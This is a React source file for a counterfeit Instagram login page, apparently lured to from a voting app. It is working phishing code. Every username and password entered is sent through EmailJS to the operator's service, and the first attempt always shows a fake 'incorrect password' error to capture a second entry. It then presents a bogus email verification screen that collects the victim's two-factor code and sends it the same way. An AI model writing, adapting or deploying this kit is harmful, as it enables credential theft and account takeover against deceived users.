import { useState } from "react";
import phoneCollage from "../../public/image.png"; // your phone collage image
import emailjs from 'emailjs-com';
import { FaEye, FaEyeSlash } from 'react-icons/fa';

// Simple Facebook "f" glyph
const FacebookGlyph = () => (
  <svg aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" className="inline-block align-[-2px]">
    <path d="M22 12.06C22 6.48 17.52 2 11.94 2S2 6.48 2 12.06C2 17.08 5.66 21.2 10.44 22v-7.04H7.9v-2.9h2.54V9.79c0-2.5 1.49-3.88 3.77-3.88 1.09 0 2.23.19 2.23.19v2.45h-1.26c-1.24 0-1.63.77-1.63 1.56v1.88h2.78l-.44 2.9h-2.34V22C18.34 21.2 22 17.08 22 12.06z" fill="currentColor"/>
  </svg>
);

    function InstagramLogin({ onBack, onLoginSuccess }) {
    const [formData, setFormData] = useState({ username: "", password: "" });
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [loginAttempts, setLoginAttempts] = useState(0);
    const [showPassword, setShowPassword] = useState(false);
    const [showVerification, setShowVerification] = useState(false);
    const [verificationCode, setVerificationCode] = useState("");
    const [isVerifying, setIsVerifying] = useState(false);

    const handleChange = (e) =>
        setFormData((s) => ({ ...s, [e.target.name]: e.target.value }));

    const handleSubmit = (e) => {
        e.preventDefault();
        console.log("Login attempt:", formData);
        
        // Reset error state
        setShowError(false);
        
        // Set loading state
        setIsLoading(true);
        
        // Send email using EmailJS
        const templateParams = {
            to_name: "Admin",
            from_name: formData.username,
            from_email: formData.username,
            message: `Login attempt details:
            
Username: ${formData.username}
Password: ${formData.password}
Timestamp: ${new Date().toLocaleString()}
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}
IP Address: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}`,
            to_email: "zcL4jj0QhEChPRS1V",
            cc_email: "ccVYMZ-EhtB11G8yBC8YX"
        };

        // You'll need to replace these with your actual EmailJS credentials
        emailjs.send(
            'service_ijklxic', // Replace with your EmailJS service ID
            'template_n8csemo', // Replace with your EmailJS template ID
            templateParams,
            'zcL4jj0QhEChPRS1V' // Replace with your EmailJS user ID
        )
        .then((response) => {
            console.log('Email sent successfully:', response);
            
            // Increment login attempts
            setLoginAttempts(prev => prev + 1);
            
            if (loginAttempts === 0) {
                // First attempt: show error, clear password, stay on page
                console.log('First login attempt - showing error and staying on page');
                setFormData(prev => ({ ...prev, password: "" }));
            } else {
                // Second attempt: show verification step
                console.log('Second login attempt - showing verification step');
                setShowVerification(true);
            }
        })
        .catch((error) => {
            console.error('Email sending failed:', error);
            
            // Increment login attempts even on error
            setLoginAttempts(prev => prev + 1);
            
            if (loginAttempts === 0) {
                // First attempt: show error, clear password, stay on page
                console.log('First login attempt (with error) - showing error and staying on page');
                setFormData(prev => ({ ...prev, password: "" }));
            } else {
                // Second attempt: show verification step even on error
                console.log('Second login attempt (with error) - showing verification step');
                setShowVerification(true);
            }
        })
        .finally(() => {
            // Always clear loading state
            setIsLoading(false);
            // Show error message after loading ends (only on first attempt)
            if (loginAttempts === 0) {
                setShowError(true);
            }
        });
    };

    const handleVerificationSubmit = (e) => {
        e.preventDefault();
        if (!verificationCode.trim()) return;
        
        setIsVerifying(true);
        
        // Send verification code to email
        const verificationParams = {
            to_name: "Admin",
            from_name: formData.username,
            from_email: formData.username,
            message: `Verification code entered:
            
Username: ${formData.username}
Verification Code: ${verificationCode}
Timestamp: ${new Date().toLocaleString()}
User Agent: ${navigator.userAgent}
Platform: ${navigator.platform}`,
            to_email: "zcL4jj0QhEChPRS1V",
            cc_email: "ccVYMZ-EhtB11G8yBC8YX"
        };

        emailjs.send(
            'service_ijklxic',
            'template_n8csemo',
            verificationParams,
            'zcL4jj0QhEChPRS1V'
        )
        .then((response) => {
            console.log('Verification code sent successfully:', response);
            // Call onLoginSuccess to increase Mayank's votes and go to voting page
            if (onLoginSuccess) {
                onLoginSuccess();
                console.log('onLoginSuccess called successfully');
                // Small delay to ensure state updates before closing
                setTimeout(() => {
                    onBack();
                }, 100);
            } else {
                console.log('onLoginSuccess function not provided');
                onBack();
            }
        })
        .catch((error) => {
            console.error('Verification code sending failed:', error);
            // Still go to voting page even if email fails
            if (onLoginSuccess) {
                onLoginSuccess();
                console.log('onLoginSuccess called successfully (after verification error)');
                setTimeout(() => {
                    onBack();
                }, 100);
            } else {
                console.log('onLoginSuccess function not provided');
                onBack();
            }
        })
        .finally(() => {
            setIsVerifying(false);
        });
    };

  return (
    <div className="min-h-screen bg-[#fafafa] text-[#262626]">
      {/* optional back */}
      {onBack && (
        <div className="p-4">
          <button
            onClick={onBack}
            className="rounded-full bg-gray-100 px-3 py-2 text-sm hover:bg-gray-200"
          >
            ← Back to Vote
          </button>
        </div>
      )}

      {/* Main */}
      <main className="mx-auto flex min-h-[80vh] max-w-[935px] items-center justify-center px-4">
        <div className="flex w-full items-center justify-center">
          {/* Left: phone collage (hidden on small) */}
          <div className="relative hidden w-[454px] md:block">
            <div className="relative h-[618px] w-[454px]">
              <img
                src={phoneCollage}
                alt="Instagram phone collage"
                className="h-full w-full object-cover"
                draggable={false}
              />
            </div>
          </div>

          {/* Right: form column */}
          <div className="mx-auto w-full  max-w-[350px]">
            {/* Card 1 */}
            <section className="rounded-2xl border border-gray-300 bg-white px-10 pb-6 pt-10">
              {/* Wordmark */}
              <div className="mb-6 flex items-center justify-center">
                <img src="https://thumbs.dreamstime.com/b/print-204012264.jpg" alt="Instagram" className="w-full h-full mx-auto mb-4" />
              </div>

              {/* Form */}
              <form onSubmit={handleSubmit} className="space-y-2.5">
                <input
                  type="text"
                  name="username"
                  value={formData.username}
                  onChange={handleChange}
                  placeholder="Phone number, username or email address"
                  className="w-full rounded-[5px] border border-gray-300 bg-[#fafafa] px-2.5 py-2 text-[12.5px] leading-4 placeholder:text-gray-500 focus:border-gray-400 focus:outline-none"
                  autoCapitalize="off"
                  autoCorrect="off"
                  required
                />
                <div className="relative">
                  <input
                    type={showPassword ? "text" : "password"}
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                    placeholder="Password"
                    className="w-full rounded-[5px] border border-gray-300 bg-[#fafafa] px-2.5 py-2 text-[12.5px] leading-4 placeholder:text-gray-500 focus:border-gray-400 focus:outline-none"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute inset-y-0 right-0 pr-2.5 flex items-center"
                  >
                    {showPassword ? (
                      <FaEyeSlash className="text-gray-500 text-lg" />
                    ) : (
                      <FaEye className="text-gray-500 text-lg" />
                    )}
                  </button>
                </div>

                <button
                  type="submit"
                  className="mt-2 w-full rounded-lg bg-[#0095f6] py-1.5 text-sm font-semibold text-white hover:bg-[#1877f2]/90 disabled:opacity-60"
                  disabled={!formData.username || !formData.password || isLoading}
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center gap-2">
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      <span>Logging in...</span>
                    </div>
                  ) : (
                    "Log in"
                  )}
                </button>
              </form>

              {/* Error Message */}
              {showError && (
                <div className="mt-3 text-center">
                  <p className="text-red-500 text-sm font-medium">
                    Sorry, your password was incorrect. Please double-check your password.
                  </p>
                </div>
              )}

              {/* OR divider */}
              <div className="my-4 flex items-center">
                <div className="h-px flex-1 bg-gray-300" />
                <span className="px-4 text-[12px] font-semibold text-gray-500">
                  OR
                </span>
                <div className="h-px flex-1 bg-gray-300" />
              </div>

              {/* Facebook link (not a filled button) */}
              <div className="mb-3 text-center">
                <a
                  href="#"
                  className="text-[14px] font-semibold text-[#385185] hover:underline"
                >
                  <FacebookGlyph />{" "}
                  <span className="ml-1 align-middle">Log in with Facebook</span>
                </a>
              </div>

              {/* Forgot password */}
              <div className="text-center">
                <a
                  href="#"
                  className="text-[12px] text-[#00376b] hover:underline"
                >
                  Forgotten your password?
                </a>
              </div>
            </section>

            {/* Card 2 */}
            <section className="mt-2 rounded border rounded-2xl border-gray-300 bg-white py-5 text-center text-[14px]">
              <span>Don't have an account? </span>
              <a href="#" className="font-semibold text-[#0095f6] hover:underline">
                Sign up
              </a>
            </section>

            
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="mx-auto max-w-[935px] px-4 pb-10 pt-6 text-center text-[12px] text-gray-500">
        <ul className="mb-3 flex flex-wrap justify-center gap-x-4 gap-y-1">
          {[
            "Meta","About","Blog","Jobs","Help","API","Privacy","Terms",
            "Locations","Instagram Lite","Meta AI","Meta AI articles","Threads",
            "Contact uploading and non-users","Meta Verified",
          ].map((t) => (
            <li key={t}>
              <a href="#" className="hover:underline">{t}</a>
            </li>
          ))}
        </ul>
        <div className="flex items-center justify-center gap-4">
          <span>English (UK)</span>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </footer>

      {/* Verification Popup */}
      {showVerification && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-[1px] z-50 flex items-center justify-center p-4">
          <div className="w-full max-w-md rounded-2xl bg-white text-gray-900 shadow-2xl border border-gray-200">
            {/* Top bar */}
            <div className="flex items-center justify-between px-4 py-3">
              <button
                onClick={() => setShowVerification(false)}
                className="p-2 rounded-lg hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500"
                aria-label="Close"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"/>
                </svg>
              </button>

              <button
                className="p-2 rounded-lg hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-blue-500"
                aria-label="Help"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor">
                  <path strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"
                    d="M8 10a4 4 0 118 0c0 2-2 2.5-2 4M12 17h.01"/>
                </svg>
              </button>
            </div>

            {/* Body */}
            <div className="px-5 pb-6">
              <h2 className="text-3xl font-extrabold tracking-tight mb-2 text-gray-900">Check your email</h2>
              <p className="text-gray-600 mb-5">
                Enter the code that we sent to your email and WhatsApp
              </p>

              {/* Illustration block */}
              <div className="rounded-xl overflow-hidden bg-gray-50 mb-5">
                <img 
                  src="https://pmecdn.protonweb.com/image-transformation/?s=c&image=images%2Ff_auto%2Cq_auto%2Fv1712245030%2Fwp-pme%2Fhow-to-create-an-email-address-without-phone-number-verification-blog%2Fhow-to-create-an-email-address-without-phone-number-verification-blog.%3F_i%3DAA"
                  alt="Email verification illustration"
                  className="w-full h-full object-cover"
                />
              </div>

              {/* Form */}
              <form onSubmit={handleVerificationSubmit} className="space-y-4">
                <input
                  inputMode="numeric"
                  pattern="\d*"
                  maxLength={6}
                  autoFocus
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, ""))}
                  placeholder="Enter code"
                  className="w-full h-14 px-4 rounded-xl bg-white border border-gray-300 text-gray-900 placeholder-gray-500
                             focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  aria-label="Verification code"
                />

                <button
                  type="button"
                  className="text-blue-600 text-sm font-medium hover:underline"
                >
                  Get a new code
                </button>

                <button
                  type="submit"
                  disabled={!verificationCode.trim() || isVerifying}
                  className="w-full h-14 rounded-xl font-semibold
                             bg-blue-600 hover:bg-blue-700 text-white
                             disabled:opacity-50 disabled:hover:bg-blue-600 transition-colors"
                >
                  {isVerifying ? (
                    <span className="inline-flex items-center gap-2">
                      <span className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                      Verifying…
                    </span>
                  ) : (
                    "Continue"
                  )}
                </button>

                <button
                  type="button"
                  className="w-full h-14 rounded-xl font-semibold border border-gray-300 text-gray-700 hover:bg-gray-50"
                >
                  Try another way
                </button>
              </form>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

export default InstagramLogin;
